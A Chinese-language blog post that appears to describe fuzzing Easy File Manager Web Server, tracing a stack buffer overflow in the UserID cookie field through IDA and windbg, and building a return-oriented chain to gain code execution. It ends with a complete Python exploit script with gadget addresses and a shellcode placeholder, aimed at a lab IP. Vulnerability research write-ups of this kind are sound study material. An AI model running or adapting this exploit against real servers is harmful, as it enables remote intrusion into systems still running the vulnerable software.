---
layout: post
title:  "一次从fuzz到exp的完整经历"
date:   2015-03-22 12:48:00
categories: Exploit
---

## 0x0 序
这几天学了下python，拿它写了个关于HTTP的fuzz的工具，还好有几年编程基础，没在语法上较太多劲。写完后，立马找了个软件《Easy File Manager Web Server》，拿来测试一下效果。没用多久，就测出了一个BUG，下面我会详细描述这个漏洞的发现过程以及利用方法，以便可以和漏洞爱好者们share一番。值得说明的是，该漏洞一年前就被修补，可以放心的拿来分析了。

## 0x1 漏洞发现
在fuzz之前，需要先了解客户端-服务器通信的数据包的内容。打开wireshark，我这里把fuzz对象fmws.exe跑在了虚拟机上，通过主机浏览器访问

![图片1](https://turingsec.github.io/knowledge/posts/)

Wireshark捕获的数据包如下：

![图片2](https://turingsec.github.io/knowledge/posts/)

对上面几个关键的KEY做测试，最后在测试UserID字段时，发现过长的字符串会导致崩溃：

![图片3](https://turingsec.github.io/knowledge/posts/)
![图片4](https://turingsec.github.io/knowledge/posts/)

初步分析崩溃原因为：ESI为某个对象指针，超长字符串溢出淹没了ESI+10h位置上的数据edx，在调用edx+28位置上的函数时，因edx被篡改为0x90909090，导致内存非法访问。下一步来确定溢出具体位置和原因。

## 0x2 漏洞原因
给esi下硬件断点，程序断在了串处理指令内存拷贝时。结合IDA来分析漏洞原因

![图片5](https://turingsec.github.io/knowledge/posts/)
![图片6](https://turingsec.github.io/knowledge/posts/)

首先程序检查了参数arg_4的长度，arg_4是超长字符串起始地址。但是很明显是以字符串的结尾\0来计算长度，因为我测试的超长字符串为连续的0x90，所以此时ecx的值等于字符串中0x90的个数。

再来看看目的缓冲区的大小，缓冲区是位于函数栈帧的一个局部变量，在IDA中查看定义：

![图片7](https://turingsec.github.io/knowledge/posts/)

结合windbg中的内存，目测大小为0x40，范围0x03a99880-0x03a998bf。也就是说，只要发送的UserID字段的值的长度>0x40，在往位于栈内的缓冲区拷贝时，就会产生内存溢出。

## 0x3 漏洞利用
导致异常的原因是esi指向的对象，在偏移10h位置的数据被字符串修改为0x90909090，那么接下来只要确定在字符串中的偏移，就可以达到控制EIP的目的。我是还没来得及用python写个非重复字符的算法，就来测试FUZZ的效果，其实这里写个非重复字符来FUZZ会更好，一眼就能看出来偏移位置。

![图片8](https://turingsec.github.io/knowledge/posts/)

从漏洞原因一节的第一幅图可以看出，目的缓冲区是从0x03a99880开始的，导致跳转的字节为0x03a998d0，也就是说字符串偏移0x50的位置的值可以控制寄存器EIP。那么问题来了，我们需要让EIP跳转到哪里呢？在这之前，先要确定EXE加载了哪些模块，以及这些模块是否开启了DEP/ASLR。

![图片9](https://turingsec.github.io/knowledge/posts/)
![图片17](https://turingsec.github.io/knowledge/posts/)

用LoadPE查看两个PE文件的IMAGE_OPTIONAL_HEADER结构DllCharacteristics变量都等于0x0000，那么这两个PE都没有开启DEP/ASLR，那么稍后要选择的gadgets可以从这两个模块的内存空间中寻找。

观察esp寄存器的值，距离可控数据起始地址0x03a99880还有0xEC个字节，如果能够让ESP增加到可控数据地址之后，那么就可以控制程序堆栈了。在以上两个模块中寻找合适的gadget。

这里我说一下我寻找gadgets的方法。我是用VS先把汇编翻译成机器码，然后在进程空间的可用模块中搜索。一般情况下，会搜索出一些内存数据包含机器码，接下来排除一些不符合条件的地址，比如说内存不可执行，或者内存地址本身包含有坏字符（比如这个例子中的’\0’）。

![图片10](https://turingsec.github.io/knowledge/posts/)

上面找到的这个gadget在返回时提高esp超过可控数据起始地址，也就是说，执行完这段代码后，我们控制了堆栈。

在内存中搜索0x1001d87a，找到了两个地址，因为跳转时指令为call [edx+28]，故选择内存地址0x1001d918-0x28=0x1001d8f0（和查找的第一个内存地址重复了，纯属巧合）作为字符串0x50偏移处的值。

![图片11](https://turingsec.github.io/knowledge/posts/)

控制了堆栈后并确定进程没有使用DEP链接选项，因为我的虚拟机跑的是win7，默认的DEP工作状态是Optin，也就是说只要让eip跳到esp指向的可控数据，就会远程执行代码。在内存中查找jmp esp之类的操作码，找到了一处。但是该内存地址包含坏字符，如果直接把0x004d3fc3放到字符串中发送到fmws.exe，在溢出点计算长度时就会被拦截下。所以这时需要查找其他的gadget来间接拼接出地址0x004d3fc3。

![图片12](https://turingsec.github.io/knowledge/posts/)

拼接出0x004d3fc3，并跳转到该地址的办法很多，不同的环境下采用不同的方法。这里我采用这样一种方法：先在进程空间中找到类似add exx，x的代码，而且常量x的最高8位必须不为0x00，才能绕过坏字符。然后在栈空间中布局一个合理的常量，使add exx,x后的值等于0x004d3fc3，然后找到push exx, ret这样的代码，就可以执行远程代码了。

贴出几个关键的gadgets：

![图片13](https://turingsec.github.io/knowledge/posts/)
![图片14](https://turingsec.github.io/knowledge/posts/)

下面再附上一张图，实现了远程代码执行：

![图片15](https://turingsec.github.io/knowledge/posts/)

最后附上EXP：

```
import random
import socket

payload = "\x90" * 0x50;
payload += "\xf0\xd8\x01\x10";    #the address of "add esp" at poi(0x1001D8F0 + 28)=0x1001d87a;
payload += "\x90" * 0x118;
payload += "\x40\x02\x01\x10";    #add esp, 10;ret
payload += "\x90" * 0x4;
payload += "\x6a\x4e\x01\x10";    #0x0 to pass jnz
payload += "\x90" * 0x8;
payload += "\x42\x54\x01\x10";    #pop eax;ret
payload += "\x64\xe1\xef\xa4";    #5B5D5E5Fh + A4EFE164 = 004d3fc3;
payload += "\x0c\x36\x02\x10";    #add  eax,5B5D5E5Fh;ret
payload += "\x6d\x46\x02\x10";    #push eax;ret
payload += "\x0c\x0c\x0c\x0c";    #shell code
payload += "\x90" * 0x270;       

host = "192.168.14.131";
port = 80;

http = "GET /vfolder.ghp HTTP/1.1\r\n";
http += "Host: " + host + "\r\n";
http += "Connection: keep-alive\r\n";
http += "Accept: image/webp,*/*;q=0.8\r\n";
http += "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36\r\n";
http += "Referer: http://" + host + "\r\n";
http += "Accept-Encoding: gzip, deflate, sdch\r\n";
http += "Accept-Language: zh-CN,zh;q=0.8\r\n";
http += "Cookie: SESSIONID=11240; UserID=" + payload + "; PassWD=;\r\n"
http += "\r\n";

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sock.connect((host, port));

sock.send(http);
```